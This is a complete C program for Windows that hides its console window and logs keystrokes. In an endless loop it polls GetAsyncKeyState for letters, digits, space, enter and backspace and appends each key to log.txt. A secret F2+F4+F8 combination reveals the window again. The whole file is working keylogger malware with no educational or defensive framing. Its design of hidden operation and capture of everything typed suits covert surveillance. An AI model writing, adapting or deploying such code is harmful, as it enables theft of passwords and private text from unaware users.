#define _CRT_SECURE_NO_WARNINGS

#include<stdio.h>
#include <Windows.h>
#include <conio.h>

int main()
{
	FILE* fp;

	fp = fopen("log.txt", "a");

	bool backspace = false;
	bool enter = false;
	bool shift = false;
	bool space = false;
	bool numbers[10];
	bool alphabets[26];
	bool show = false;

	memset(numbers, false, sizeof(numbers));
	memset(alphabets, false, sizeof(alphabets));

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true)
	{
		#pragma region Backspace
		if (GetAsyncKeyState(VK_BACK))
		{
			if (backspace == false)
			{
				fputc(0x08, fp);
				backspace = true;
			}
		}
		else
			backspace = false;
		#pragma endregion
		#pragma region Enter
		if (GetAsyncKeyState(VK_RETURN))
		{
			if (enter == false)
			{
				fputc('\n', fp);
				enter = true;
			}
		}
		else
			enter = false;
		#pragma endregion
		#pragma region Shift
		if (GetAsyncKeyState(VK_SHIFT))
		{
			if (shift == false)
				shift = true;
		}
		else
			shift = false;
		#pragma endregion
		#pragma region Space
		if (GetAsyncKeyState(VK_SPACE))
		{
			if (space == false)
			{
				fputc(' ', fp);
				space = true;
			}
		}
		else
			space = false;
		#pragma endregion
		
		#pragma region 0
		if (GetAsyncKeyState(0x30))
		{
			if (numbers[0] == false)
			{
				fputc('0', fp);
				numbers[0] = true;
			}
		}
		else
			numbers[0] = false;
		#pragma endregion
		#pragma region 1
		if (GetAsyncKeyState(0x31))
		{
			if (numbers[1] == false)
			{
				fputc('1', fp);
				numbers[1] = true;
			}
		}
		else
			numbers[1] = false;
		#pragma endregion
		#pragma region 2
		if (GetAsyncKeyState(0x32))
		{
			if (numbers[2] == false)
			{
				fputc('2', fp);
				numbers[2] = true;
			}
		}
		else
			numbers[2] = false;
		#pragma endregion
		#pragma region 3
		if (GetAsyncKeyState(0x33))
		{
			if (numbers[3] == false)
			{
				fputc('3', fp);
				numbers[3] = true;
			}
		}
		else
			numbers[3] = false;
		#pragma endregion
		#pragma region 4
		if (GetAsyncKeyState(0x34))
		{
			if (numbers[4] == false)
			{
				fputc('4', fp);
				numbers[4] = true;
			}
		}
		else
			numbers[4] = false;
		#pragma endregion
		#pragma region 5
		if (GetAsyncKeyState(0x35))
		{
			if (numbers[5] == false)
			{
				fputc('5', fp);
				numbers[5] = true;
			}
		}
		else
			numbers[5] = false;
		#pragma endregion
		#pragma region 6
		if (GetAsyncKeyState(0x36))
		{
			if (numbers[6] == false)
			{
				fputc('6', fp);
				numbers[6] = true;
			}
		}
		else
			numbers[6] = false;
		#pragma endregion
		#pragma region 7
		if (GetAsyncKeyState(0x37))
		{
			if (numbers[7] == false)
			{
				fputc('7', fp);
				numbers[7] = true;
			}
		}
		else
			numbers[7] = false;
		#pragma endregion
		#pragma region 8
		if (GetAsyncKeyState(0x38))
		{
			if (numbers[8] == false)
			{
				fputc('8', fp);
				numbers[8] = true;
			}
		}
		else
			numbers[8] = false;
		#pragma endregion
		#pragma region 9
		if (GetAsyncKeyState(0x39))
		{
			if (numbers[9] == false)
			{
				fputc('9', fp);
				numbers[9] = true;
			}
		}
		else
			numbers[9] = false;
		#pragma endregion
		
		#pragma region A
		if (GetAsyncKeyState(0x41))
		{
			if (alphabets[0] == false)
			{
				if (shift == true)
					fputc('A', fp);
				else
					fputc('a', fp);
				alphabets[0] = true;
			}
		}
		else
			alphabets[0] = false;
		#pragma endregion
		#pragma region B
		if (GetAsyncKeyState(0x42))
		{
			if (alphabets[1] == false)
			{
				if (shift == true)
					fputc('B', fp);
				else
					fputc('b', fp);
				alphabets[1] = true;
			}
		}
		else
			alphabets[1] = false;
		#pragma endregion
		#pragma region C
		if (GetAsyncKeyState(0x43))
		{
			if (alphabets[2] == false)
			{
				if (shift == true)
					fputc('C', fp);
				else
					fputc('c', fp);
				alphabets[2] = true;
			}
		}
		else
			alphabets[2] = false;
		#pragma endregion
		#pragma region D
		if (GetAsyncKeyState(0x44))
		{
			if (alphabets[3] == false)
			{
				if (shift == true)
					fputc('D', fp);
				else
					fputc('d', fp);
				alphabets[3] = true;
			}
		}
		else
			alphabets[3] = false;
		#pragma endregion
		#pragma region E
		if (GetAsyncKeyState(0x45))
		{
			if (alphabets[4] == false)
			{
				if (shift == true)
					fputc('E', fp);
				else
					fputc('e', fp);
				alphabets[4] = true;
			}
		}
		else
			alphabets[4] = false;
		#pragma endregion
		#pragma region F
		if (GetAsyncKeyState(0x46))
		{
			if (alphabets[5] == false)
			{
				if (shift == true)
					fputc('F', fp);
				else
					fputc('f', fp);
				alphabets[5] = true;
			}
		}
		else
			alphabets[5] = false;
		#pragma endregion
		#pragma region G
		if (GetAsyncKeyState(0x47))
		{
			if (alphabets[6] == false)
			{
				if (shift == true)
					fputc('G', fp);
				else
					fputc('g', fp);
				alphabets[6] = true;
			}
		}
		else
			alphabets[6] = false;
		#pragma endregion
		#pragma region H
		if (GetAsyncKeyState(0x48))
		{
			if (alphabets[7] == false)
			{
				if (shift == true)
					fputc('H', fp);
				else
					fputc('h', fp);
				alphabets[7] = true;
			}
		}
		else
			alphabets[7] = false;
		#pragma endregion
		#pragma region I
		if (GetAsyncKeyState(0x49))
		{
			if (alphabets[8] == false)
			{
				if (shift == true)
					fputc('I', fp);
				else
					fputc('i', fp);
				alphabets[8] = true;
			}
		}
		else
			alphabets[8] = false;
		#pragma endregion
		#pragma region J
		if (GetAsyncKeyState(0x4A))
		{
			if (alphabets[9] == false)
			{
				if (shift == true)
					fputc('J', fp);
				else
					fputc('j', fp);
				alphabets[9] = true;
			}
		}
		else
			alphabets[9] = false;
		#pragma endregion
		#pragma region K
		if (GetAsyncKeyState(0x4B))
		{
			if (alphabets[10] == false)
			{
				if (shift == true)
					fputc('K', fp);
				else
					fputc('k', fp);
				alphabets[10] = true;
			}
		}
		else
			alphabets[10] = false;
		#pragma endregion
		#pragma region L
		if (GetAsyncKeyState(0x4C))
		{
			if (alphabets[11] == false)
			{
				if (shift == true)
					fputc('L', fp);
				else
					fputc('l', fp);
				alphabets[11] = true;
			}
		}
		else
			alphabets[11] = false;
		#pragma endregion
		#pragma region M
		if (GetAsyncKeyState(0x4D))
		{
			if (alphabets[12] == false)
			{
				if (shift == true)
					fputc('M', fp);
				else
					fputc('m', fp);
				alphabets[12] = true;
			}
		}
		else
			alphabets[12] = false;
		#pragma endregion
		#pragma region N
		if (GetAsyncKeyState(0x4E))
		{
			if (alphabets[13] == false)
			{
				if (shift == true)
					fputc('N', fp);
				else
					fputc('n', fp);
				alphabets[13] = true;
			}
		}
		else
			alphabets[13] = false;
		#pragma endregion
		#pragma region O
		if (GetAsyncKeyState(0x4F))
		{
			if (alphabets[14] == false)
			{
				if (shift == true)
					fputc('O', fp);
				else
					fputc('o', fp);
				alphabets[14] = true;
			}
		}
		else
			alphabets[14] = false;
		#pragma endregion
		#pragma region P
		if (GetAsyncKeyState(0x50))
		{
			if (alphabets[15] == false)
			{
				if (shift == true)
					fputc('P', fp);
				else
					fputc('p', fp);
				alphabets[15] = true;
			}
		}
		else
			alphabets[15] = false;
		#pragma endregion
		#pragma region Q
		if (GetAsyncKeyState(0x51))
		{
			if (alphabets[16] == false)
			{
				if (shift == true)
					fputc('Q', fp);
				else
					fputc('q', fp);
				alphabets[16] = true;
			}
		}
		else
			alphabets[16] = false;
		#pragma endregion
		#pragma region R
		if (GetAsyncKeyState(0x52))
		{
			if (alphabets[17] == false)
			{
				if (shift == true)
					fputc('R', fp);
				else
					fputc('r', fp);
				alphabets[17] = true;
			}
		}
		else
			alphabets[17] = false;
		#pragma endregion
		#pragma region S 
		if (GetAsyncKeyState(0x53))
		{
			if (alphabets[18] == false)
			{
				if (shift == true)
					fputc('S', fp);
				else
					fputc('s', fp);
				alphabets[18] = true;
			}
		}
		else
			alphabets[18] = false;
		#pragma endregion
		#pragma region T
		if (GetAsyncKeyState(0x54))
		{
			if (alphabets[19] == false)
			{
				if (shift == true)
					fputc('T', fp);
				else
					fputc('t', fp);
				alphabets[19] = true;
			}
		}
		else
			alphabets[19] = false;
		#pragma endregion
		#pragma region U
		if (GetAsyncKeyState(0x55))
		{
			if (alphabets[20] == false)
			{
				if (shift == true)
					fputc('U', fp);
				else
					fputc('u', fp);
				alphabets[20] = true;
			}
		}
		else
			alphabets[20] = false;
#pragma endregion
		#pragma region V
		if (GetAsyncKeyState(0x56))
		{
			if (alphabets[21] == false)
			{
				if (shift == true)
					fputc('V', fp);
				else
					fputc('v', fp);
				alphabets[21] = true;
			}
		}
		else
			alphabets[21] = false;
#pragma endregion
		#pragma region W
		if (GetAsyncKeyState(0x57))
		{
			if (alphabets[22] == false)
			{
				if (shift == true)
					fputc('W', fp);
				else
					fputc('w', fp);
				alphabets[22] = true;
			}
		}
		else
			alphabets[22] = false;
		#pragma endregion
		#pragma region X
		if (GetAsyncKeyState(0x58))
		{
			if (alphabets[23] == false)
			{
				if (shift == true)
					fputc('X', fp);
				else
					fputc('x', fp);
				alphabets[23] = true;
			}
		}
		else
			alphabets[23] = false;
		#pragma endregion
		#pragma region Y
		if (GetAsyncKeyState(0x59))
		{
			if (alphabets[24] == false)
			{
				if (shift == true)
					fputc('Y', fp);
				else
					fputc('y', fp);
				alphabets[24] = true;
			}
		}
		else
			alphabets[24] = false;
		#pragma endregion
		#pragma region Z
		if (GetAsyncKeyState(0x5A))
		{
			if (alphabets[25] == false)
			{
				if (shift == true)
					fputc('Z', fp);
				else
					fputc('z', fp);
				alphabets[25] = true;
			}
		}
		else
			alphabets[25] = false;
		#pragma endregion

		if (GetAsyncKeyState(0x71) && GetAsyncKeyState(0x73) && GetAsyncKeyState(0x77))
			show = !show;

		if (show == false)
		{
			ShowWindow(GetConsoleWindow(), SW_HIDE);
		}
		else if (show == true)
		{
			ShowWindow(GetConsoleWindow(), SW_SHOW);
		}
	}
}